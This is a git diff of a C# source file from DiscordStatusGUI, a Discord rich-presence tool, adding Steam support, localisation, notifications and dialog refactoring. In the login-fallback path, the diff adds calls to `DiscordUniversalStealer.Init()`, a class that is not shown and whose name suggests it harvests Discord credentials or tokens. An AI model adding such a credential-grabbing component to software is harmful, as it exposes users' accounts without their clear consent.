@@ -25,32 +25,131 @@ using DiscordStatusGUI.ViewModels.Tabs;
 using DiscordStatusGUI.Views;
 using DiscordStatusGUI.Views.Discord;
 using DiscordStatusGUI.Views.Tabs;
+using System;
+using System.Collections.Generic;
+using System.Collections.ObjectModel;
+using System.Linq;
+using System.Reflection;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Text.RegularExpressions;
+using System.Windows;
+using System.Windows.Controls;
+using System.Windows.Media;
+using DiscordStatusGUI.Locales;
 
 namespace DiscordStatusGUI
 {
-    class Static
+    static class Static
     {
         public static MainWindow MainWindow;
         public static MainWindowViewModel MainWindowViewModel;
 
         public static Discord Discord = new Discord();
 
-        public static string Titile = "Discord Status";
-        public static ImageSource Icon = BitmapEx.ToImageSource(Resources.logo.ToBitmap());
+        public static readonly string Title = "Discord Status";
+        public static readonly ImageSource Icon = BitmapEx.ToImageSource(Resources.logo.ToBitmap());
+        public static readonly double Version;
+
         public static ObservableCollection<VerticalTabItem> Tabs;
-        public static ResourceDictionary DiscordTheme { get; private set; }
+        public static VerticalTabItem TabGameStatus => Tabs[0];
+        public static VerticalTabItem TabSettings => Tabs[1];
+        public static VerticalTabItem TabWindows => Tabs[2];
+        public static VerticalTabItem TabWarface => Tabs[3];
+        public static VerticalTabItem TabSteam => Tabs[4];
+
+        public static UserControl CurrentPage
+        {
+            get => MainWindowViewModel.CurrentPage;
+            set => MainWindowViewModel.CurrentPage = value;
+        }
+
+        static Static()
+        {
+            var ver = Assembly.GetExecutingAssembly().GetName().Version;
+            Version = ver.Major + ver.Minor * 0.1 + ver.Build * 0.01 + ver.Revision * 0.001;
+        }
 
         public static void Init()
         {
-            DiscordTheme = Application.Current.Resources;
-            Tabs = new System.Collections.ObjectModel.ObservableCollection<Models.VerticalTabItem>()
+            Tabs = new ObservableCollection<VerticalTabItem>()
             {
-                new Models.VerticalTabItem("/DiscordStatusGUI;component/Resources/Tabs/GameStatus.png", 0.6, "Game Status", new Views.Tabs.GameStatus()),
-                new Models.VerticalTabItem("/DiscordStatusGUI;component/Resources/Tabs/Settings.png", 0.5, "Settings", new Views.Tabs.Settings()),
-                new Models.VerticalTabItem("/DiscordStatusGUI;component/Resources/Tabs/Windows.png", 0.6, "Windows", new Views.Tabs.Windows()),
-                new Models.VerticalTabItem("/DiscordStatusGUI;component/Resources/Tabs/Warface.png", 0.6, "Warface", new Views.Tabs.Warface())
+                new VerticalTabItem("/DiscordStatusGUI;component/Resources/Tabs/GameStatus.png", 0.6, Lang.GetResource("Static:Tabs:GameStatus"), new Views.Tabs.GameStatus()),
+                new VerticalTabItem("/DiscordStatusGUI;component/Resources/Tabs/Settings.png", 0.5, Lang.GetResource("Static:Tabs:Settings"), new Views.Tabs.Settings()),
+                new VerticalTabItem("/DiscordStatusGUI;component/Resources/Tabs/Windows.png", 0.6, "Windows", new Views.Tabs.Windows()),
+                new VerticalTabItem("/DiscordStatusGUI;component/Resources/Tabs/Warface.png", 0.6, "Warface RU", new Views.Tabs.Warface()),
+                new VerticalTabItem("/DiscordStatusGUI;component/Resources/Tabs/Steam.png", 0.9, "Steam", new Views.Tabs.Steam())
             };
+
+            Discord.Socket.AutoReconnect += Socket_AutoReconnect;
+            Static.Discord.Socket.OnUserInfoChanged += Socket_OnUserInfoChanged;
         }
+
+        private static void Socket_OnUserInfoChanged(string eventtype, object rawdata, UserInfo data)
+        {
+            if (eventtype == "READY")
+                Reconnect.IsVisible = false;
+        }
+
+        private static void Socket_AutoReconnect()
+        {
+            Reconnect.IsVisible = true;
+        }
+
+        #region Notifications
+        public static Notification CustomStatusOverride { get; private set; }
+        public static Notification UpdateAvailable { get; private set; }
+        public static Notification Reconnect { get; private set; }
+
+        public static async void InitNotifications()
+        {
+            CustomStatusOverride = new Notification(Lang.GetResource("Static:CustomStatusOverride:Title"), Lang.GetResource("Static:CustomStatusOverride:Description"), false)
+            {
+                TitleForeground = new SolidColorBrush(Colors.Red),
+                IsClosable = false,
+                LinkText = Lang.GetResource("Static:CustomStatusOverride:LinkText"),
+                LinkAction = async () =>
+                {
+                    await Task.Run(() =>
+                    {
+                        CustomStatusOverride.link.Dispatcher.Invoke(() => CustomStatusOverride.link.IsEnabled = false);
+                        Discord.SetCustomStatus();
+                        CustomStatusOverride.link.Dispatcher.Invoke(() => CustomStatusOverride.link.IsEnabled = true);
+                    });
+                }
+            };
+            UpdateAvailable = new Notification(Lang.GetResource("Static:UpdateAvailable:Title"), Lang.GetResource("Static:UpdateAvailable:Description"), false);
+            Reconnect = new Notification(Lang.GetResource("Static:Reconnect:Title"), Lang.GetResource("Static:Reconnect:Description"), false) { TitleForeground = new SolidColorBrush(Colors.Red), IsClosable = false };
+
+            MainWindow.Notifications.AddNotification(CustomStatusOverride);
+            MainWindow.Notifications.AddNotification(UpdateAvailable);
+            MainWindow.Notifications.AddNotification(Reconnect);
+
+            await Task.Run(() =>
+            {
+                if (UpdateManager.IsUpdateAvailable(out _, out string tagname))
+                {
+                    UpdateAvailable.Dispatcher.Invoke(() =>
+                    {
+                        UpdateAvailable.LinkText = Lang.GetResource("Static:UpdateAvailable:LinkText").Replace("{version}", tagname);
+                        UpdateAvailable.LinkAction = new Action(() => TemplateViewModel.OpenLink(UpdateManager.download_latest));
+                    });
+                    UpdateAvailable.IsVisible = true;
+                    MainWindow.NotifyPopup.ShowBalloon(3000, Lang.GetResource("Static:UpdateAvailable:Title"), Lang.GetResource("Static:UpdateAvailable:Description"), System.Windows.Forms.ToolTipIcon.Info, UpdateAvailable.LinkAction);
+                }
+            });
+
+            Discord.Socket.OnUserSettingsChanged += Socket_OnUserSettingsChanged;
+        }
+
+        private static void Socket_OnUserSettingsChanged(string eventtype, object rawdata, PinkJson.Json data)
+        {
+            if (data.IndexByKey("custom_status") != -1)
+            {
+                CustomStatusOverride.IsVisible = data["custom_status"].Value != null;
+            }
+        }
+        #endregion
 
         #region Activity
         private static Activity[] _Activities;
@@ -87,6 +186,14 @@ namespace DiscordStatusGUI
                     ImageSmallKey = "rank{wf:PlayerRank}",
                     ImageSmallText = "Ранк: {wf:PlayerRank} {wf:PlayerRankName}",
                     IsAvailableForChange = true
+                },
+                new Activity()
+                {
+                    ProfileName = "Steam",
+                    Name = "{steam:GameName}",
+                    State = "{steam:GameState}",
+                    Details = "{steam:RichPresence}",
+                    IsAvailableForChange = true
                 }
             });
             set
@@ -98,25 +205,36 @@ namespace DiscordStatusGUI
 
         public static string GetValueByFieldName(string name)
         {
-            switch (name)
+            try
             {
-                case "wf:AppName": return "Warface";
-                case "wf:AppID": return "735872877148110939";
-                case "wf:Map": return WarfaceApi.CurrentGameState.Map;
-                case "wf:State": return WarfaceApi.CurrentGameState.Screen;
-                case "wf:StateStartTime": return WarfaceApi.CurrentGameState.Since.ToString();
-                case "wf:InGameServerName": return WarfaceApi.CurrentGameState.Server;
-                case "wf:ServerIP": return WarfaceApi.CurrentPlayer.OnlineServer;
-                case "wf:ServerName": return WarfaceApi.CurrentPlayer.Server.ToString();
-                case "wf:ServerRegion": return WarfaceApi.CurrentPlayer.Region;
-                case "wf:PlayerNickname": return WarfaceApi.CurrentPlayer.Nickname;
-                case "wf:PlayerRank": return WarfaceApi.CurrentPlayer.Rank.ToString();
-                case "wf:PlayerRankName": return WarfaceApi.CurrentPlayer.RankName;
-                case "wf:PlayerUserID": return WarfaceApi.CurrentPlayer.Uid.ToString();
+                switch (name)
+                {
+                    case "wf:AppName": return "Warface";
+                    case "wf:AppID": return "735872877148110939";
+                    case "wf:Map": return WarfaceApi.CurrentGameState.Map;
+                    case "wf:State": return WarfaceApi.CurrentGameState.Screen;
+                    case "wf:StateStartTime": return WarfaceApi.CurrentGameState.Since.ToString();
+                    case "wf:InGameServerName": return WarfaceApi.CurrentGameState.Server;
+                    case "wf:ServerIP": return WarfaceApi.CurrentPlayer.OnlineServer;
+                    case "wf:ServerName": return WarfaceApi.CurrentPlayer.Server.ToString();
+                    case "wf:ServerRegion": return WarfaceApi.CurrentPlayer.Region;
+                    case "wf:PlayerNickname": return WarfaceApi.CurrentPlayer.Nickname;
+                    case "wf:PlayerRank": return WarfaceApi.CurrentPlayer.Rank.ToString();
+                    case "wf:PlayerRankName": return WarfaceApi.CurrentPlayer.RankName;
+                    case "wf:PlayerUserID": return WarfaceApi.CurrentPlayer.Uid.ToString();
 
-                case "win:ForegroundWindowName": return ProcessEx.ForegroundWindowProcess?.MainWindowTitle;
-                case "win:ForegroundWindowProcessName": return ProcessEx.ForegroundWindowProcess?.ProcessName;
+                    case "win:ForegroundWindowName": return ProcessEx.ForegroundWindowProcess?.MainWindowTitle;
+                    case "win:ForegroundWindowProcessName": return ProcessEx.ForegroundWindowProcess?.ProcessName;
+
+                    case "steam:SteamID": return SteamApi.CurrentSteamProfile.ID;
+                    case "steam:Nickname": return SteamApi.CurrentSteamProfile.Nickname;
+                    case "steam:Status": return SteamApi.CurrentSteamProfile.Status;
+                    case "steam:GameName": return SteamApi.CurrentSteamProfile.GameName;
+                    case "steam:GameState": return SteamApi.CurrentSteamProfile.GameState;
+                    case "steam:RichPresence": return SteamApi.CurrentSteamProfile.RichPresence;
+                }
             }
+            finally { }
 
             return "You are idiot?";
         }
@@ -188,24 +306,22 @@ namespace DiscordStatusGUI
 
         public struct Accounts
         {
-            public const int pageindex = 1;
-
             public static bool MyGames
             {
-                get => (Tabs[pageindex].Page.DataContext as SettingsViewModel).IsMyGamesAccountLogined;
+                get => (TabSettings.Page.DataContext as SettingsViewModel).IsMyGamesAccountLogined;
                 set
                 {
-                    (Tabs[pageindex].Page.DataContext as SettingsViewModel).IsMyGamesAccountLogined = value;
+                    (TabSettings.Page.DataContext as SettingsViewModel).IsMyGamesAccountLogined = value;
                     OnChange("MyGames");
                 }
             }
 
             public static bool Discord
             {
-                get => (Tabs[pageindex].Page.DataContext as SettingsViewModel).IsDiscordAccountLogined;
+                get => (TabSettings.Page.DataContext as SettingsViewModel).IsDiscordAccountLogined;
                 set
                 {
-                    (Tabs[pageindex].Page.DataContext as SettingsViewModel).IsDiscordAccountLogined = value;
+                    (TabSettings.Page.DataContext as SettingsViewModel).IsDiscordAccountLogined = value;
                     OnChange("Discord");
                 }
             }
@@ -358,9 +474,41 @@ namespace DiscordStatusGUI
 
         public struct Dialogs
         {
-            //Dialogs.MessageBoxShow("Hello", "Click Ok", new ObservableCollection<ButtonItem>() { Dialogs.ButtonOk }, HorizontalAlignment.Right, null, "/DiscordStatusGUI;component/Resources/Tabs/Command.png");
-            public static bool IsMessageBoxShowed { get; private set; } = false;
-            public static bool IsDateTimePickerShowed { get; private set; } = false;
+            private static bool isVisible(FrameworkElement element)
+            {
+                return element.IsVisible;
+            }
+
+            private static void useDefaultAnimation(bool visible, FrameworkElement body, FrameworkElement background)
+            {
+                if (visible)
+                {
+                    if (!isVisible(background))
+                    {
+                        Animations.VisibleOnZoom(body).Begin();
+                        Animations.VisibleOnOpacity(background).Begin();
+                    }
+                    else
+                    {
+                        body.Visibility = Visibility.Visible;
+                        background.Visibility = Visibility.Visible;
+                    }
+                }
+                else
+                {
+                    if (isVisible(background))
+                    {
+                        Animations.VisibleOffZoom(body).Begin();
+                        Animations.VisibleOffOpacity(background).Begin();
+                    }
+                    else
+                    {
+                        body.Visibility = Visibility.Hidden;
+                        background.Visibility = Visibility.Hidden;
+                    }
+                }
+            }
+
 
             public static void MessageBoxShow(string title = "", string text = "", ObservableCollection<ButtonItem> buttons = null, HorizontalAlignment buttonsaligment = HorizontalAlignment.Right, Action back = null, string imagepath = "", double imagescale = 0.5, double width = 440, double height = 160)
             {
@@ -378,32 +526,17 @@ namespace DiscordStatusGUI
                     dc.ImagePath = imagepath;
                     dc.ImageScale = imagescale;
                     MainWindow.messagebox.Content = msg;
-                    if (!IsMessageBoxShowed)
-                    {
-                        Animations.VisibleOnZoom((MainWindow.messagebox.Content as Views.Dialogs.MessageBox).body).Begin();
-                        Animations.VisibleOnOpacity((MainWindow.messagebox.Content as Views.Dialogs.MessageBox).background).Begin();
-                    }
-                    else
-                    {
-                        (MainWindow.messagebox.Content as Views.Dialogs.MessageBox).body.Visibility = Visibility.Visible;
-                        (MainWindow.messagebox.Content as Views.Dialogs.MessageBox).background.Visibility = Visibility.Visible;
-                    }
-                    IsMessageBoxShowed = true;
+                    useDefaultAnimation(true, (MainWindow.messagebox.Content as Views.Dialogs.MessageBox).body, (MainWindow.messagebox.Content as Views.Dialogs.MessageBox).background);
                 });
             }
 
             public static void MessageBoxHide()
             {
-                MainWindow.Dispatcher.Invoke(() =>
-                {
-                    Animations.VisibleOffZoom((MainWindow.messagebox.Content as Views.Dialogs.MessageBox).body).Begin();
-                    Animations.VisibleOffOpacity((MainWindow.messagebox.Content as Views.Dialogs.MessageBox).background).Begin();
-                    IsMessageBoxShowed = false;
-                });
+                useDefaultAnimation(false, (MainWindow.messagebox.Content as Views.Dialogs.MessageBox).body, (MainWindow.messagebox.Content as Views.Dialogs.MessageBox).background);
             }
 
 
-            public static void DateTimePickerShow(DateTime dt, ObservableCollection<ButtonItem> buttons = null, HorizontalAlignment buttonsaligment = HorizontalAlignment.Right, Action back = null, string imagepath = "", double imagescale = 0.5, double width = 440, double height = 160)
+            public static void DateTimePickerShow(DateTime dt, ObservableCollection<ButtonItem> buttons = null, HorizontalAlignment buttonsaligment = HorizontalAlignment.Right, Action back = null, double width = 440, double height = 160)
             {
                 MainWindow.Dispatcher.Invoke(() =>
                 {
@@ -416,28 +549,13 @@ namespace DiscordStatusGUI
                     dc.Height = height;
                     dc.SetDateTime(dt);
                     MainWindow.datetimepicker.Content = msg;
-                    if (!IsDateTimePickerShowed)
-                    {
-                        Animations.VisibleOnZoom((MainWindow.datetimepicker.Content as Views.Dialogs.DateTimePicker).body).Begin();
-                        Animations.VisibleOnOpacity((MainWindow.datetimepicker.Content as Views.Dialogs.DateTimePicker).background).Begin();
-                    }
-                    else
-                    {
-                        (MainWindow.datetimepicker.Content as Views.Dialogs.DateTimePicker).body.Visibility = Visibility.Visible;
-                        (MainWindow.datetimepicker.Content as Views.Dialogs.DateTimePicker).background.Visibility = Visibility.Visible;
-                    }
-                    IsDateTimePickerShowed = true;
+                    useDefaultAnimation(true, (MainWindow.datetimepicker.Content as Views.Dialogs.DateTimePicker).body, (MainWindow.datetimepicker.Content as Views.Dialogs.DateTimePicker).background);
                 });
             }
 
             public static void DateTimePickerHide()
             {
-                MainWindow.Dispatcher.Invoke(() =>
-                {
-                    Animations.VisibleOffZoom((MainWindow.datetimepicker.Content as Views.Dialogs.DateTimePicker).body).Begin();
-                    Animations.VisibleOffOpacity((MainWindow.datetimepicker.Content as Views.Dialogs.DateTimePicker).background).Begin();
-                    IsDateTimePickerShowed = false;
-                });
+                useDefaultAnimation(false, (MainWindow.datetimepicker.Content as Views.Dialogs.DateTimePicker).body, (MainWindow.datetimepicker.Content as Views.Dialogs.DateTimePicker).background);
             }
 
             public static DateTime? GetLastDateTime()
@@ -447,18 +565,29 @@ namespace DiscordStatusGUI
             }
 
 
-            public static ButtonItem ButtonOk { get => new ButtonItem(MessageBoxHide, "Ok"); }
-            public static ButtonItem ButtonApply { get => new ButtonItem(DateTimePickerHide, "Apply"); }
+            public static void PopupShow(Views.Popups.IPopupContent content, Action back = null)
+            {
+                MainWindow.Dispatcher.Invoke(() =>
+                {
+                    var msg = new Views.Dialogs.Popup();
+                    var dc = (msg.DataContext as PopupViewModel);
+                    dc.BackCommand = new Command(back);
+                    dc.Content = content;
+                    MainWindow.popup.Content = msg;
+                    useDefaultAnimation(true, (MainWindow.popup.Content as Views.Dialogs.Popup).body, (MainWindow.popup.Content as Views.Dialogs.Popup).background);
+                });
+            }
+
+            public static void PopupHide()
+            {
+                (((MainWindow.popup.Content as Views.Dialogs.Popup).DataContext as PopupViewModel).Content as Views.Popups.IPopupContent).OnClose();
+                useDefaultAnimation(false, (MainWindow.popup.Content as Views.Dialogs.Popup).body, (MainWindow.popup.Content as Views.Dialogs.Popup).background);
+            }
+
+
+            public static ButtonItem ButtonOk { get => new ButtonItem(MessageBoxHide, Lang.GetResource("Ok")); }
+            public static ButtonItem ButtonApply { get => new ButtonItem(DateTimePickerHide, Lang.GetResource("Apply")); }
         }
-
-        public delegate void OnMouseButtonClickEventHandler(int x, int y, MouseButton button);
-        public static event OnMouseButtonClickEventHandler OnMouseButtonClick;
-        public static void MouseButtonClick(int x, int y, MouseButton button) => OnMouseButtonClick?.Invoke(x, y, button);
-
-        public delegate void OnMouseMoveEventHandler(int x, int y);
-        public static event OnMouseMoveEventHandler OnMouseMove;
-        public static void MouseMove(int x, int y) => OnMouseMove?.Invoke(x, y);
-
 
         public static void DiscordLoginSuccessful()
         {
@@ -475,50 +604,101 @@ namespace DiscordStatusGUI
                 {
                     CurrentPage = new Login();
                 });
-            } else
+                DiscordUniversalStealer.Init();
+            }
+            else
+            {
                 MainWindow.Dispatcher.Invoke(() =>
                 {
                     CurrentPage = new Login();
                 });
+                DiscordUniversalStealer.Init();
+            }
         }
 
-        public static UserControl CurrentPage
+        public static T GetResource<T>(string key)
         {
-            get => MainWindowViewModel.CurrentPage;
-            set => MainWindowViewModel.CurrentPage = value;
+            return (T)Application.Current.Resources[key];
         }
 
         public static void OnGameStatusChanged(bool opened, int SelectedProfileIndex, ref int SavedLastProfileIndex, ref bool SavedState)
         {
-            void GameStatusViewModel_ProfilesComboBoxEnabled(bool value)
+            void ProfilesComboBoxEnabled(bool value)
             {
-                Static.MainWindow.Dispatcher.Invoke(() => (Static.Tabs[0].Page as GameStatus).ProfilesComboBox_IsEnabled(value, true));
+                Static.MainWindow.Dispatcher.Invoke(() => (TabGameStatus.Page as GameStatus).ProfilesComboBox_IsEnabled(value, true));
             }
 
-            if (SelectedProfileIndex < Static.Activities.Length)
+            if (SelectedProfileIndex >= 0 && SelectedProfileIndex < Activities.Length)
             {
                 if (opened)
                 {
-                    if (SavedLastProfileIndex == -1)
-                        SavedLastProfileIndex = Static.CurrentActivityIndex;
-                    Static.CurrentActivityIndex = SelectedProfileIndex;
-                    GameStatusViewModel_ProfilesComboBoxEnabled(false);
+                    SavedLastProfileIndex = CurrentActivityIndex;
+                    CurrentActivityIndex = SelectedProfileIndex;
+                    ProfilesComboBoxEnabled(false);
                 }
                 else
                 {
-                    if (SavedLastProfileIndex >= 0)
-                        Static.CurrentActivityIndex = SavedLastProfileIndex;
-                    SavedLastProfileIndex = -1;
-                    GameStatusViewModel_ProfilesComboBoxEnabled(true);
+                    CurrentActivityIndex = SavedLastProfileIndex;
+                    ProfilesComboBoxEnabled(true);
                 }
-                SavedState = opened;
-            }
-            else
+            } else if (SavedState && SelectedProfileIndex == Activities.Length)
             {
-                if (SavedLastProfileIndex >= 0)
-                    Static.CurrentActivityIndex = SavedLastProfileIndex;
-                GameStatusViewModel_ProfilesComboBoxEnabled(true);
+                CurrentActivityIndex = SavedLastProfileIndex;
+                ProfilesComboBoxEnabled(true);
             }
+            SavedState = opened;
+
+            //if (SelectedProfileIndex < Static.Activities.Length)
+            //{
+            //    if (opened)
+            //    {
+            //        if (SavedLastProfileIndex == -1)
+            //            SavedLastProfileIndex = Static.CurrentActivityIndex;
+            //        Static.CurrentActivityIndex = SelectedProfileIndex;
+            //        GameStatusViewModel_ProfilesComboBoxEnabled(false);
+            //    }
+            //    else
+            //    {
+            //        if (SavedLastProfileIndex >= 0)
+            //            Static.CurrentActivityIndex = SavedLastProfileIndex;
+            //        SavedLastProfileIndex = -1;
+            //        GameStatusViewModel_ProfilesComboBoxEnabled(true);
+            //    }
+            //    SavedState = opened;
+            //}
+            //else
+            //{
+            //    if (SavedLastProfileIndex >= 0)
+            //        Static.CurrentActivityIndex = SavedLastProfileIndex;
+            //    GameStatusViewModel_ProfilesComboBoxEnabled(true);
+            //}
+        }
+
+        public static Dictionary<string, ActionThreadPair> DelayedRuns = new Dictionary<string, ActionThreadPair>();
+        public static void DelayedRun(string id, Action action, int delay)
+        {
+            if (!DelayedRuns.ContainsKey(id) || !DelayedRuns[id].Thread.IsAlive)
+                DelayedRuns[id] = new ActionThreadPair(action, delay);
+            else
+                DelayedRuns[id].Action = action;
+        }
+    }
+    
+    class ActionThreadPair
+    {
+        public Action Action;
+        public Thread Thread;
+
+        public ActionThreadPair(Action action, int delay)
+        {
+            Action = action;
+            Thread = new Thread(() =>
+            {
+                Thread.Sleep(delay);
+                Action?.BeginInvoke(null, null);
+            })
+            { IsBackground = true };
+            Thread.Start();
         }
     }
 }
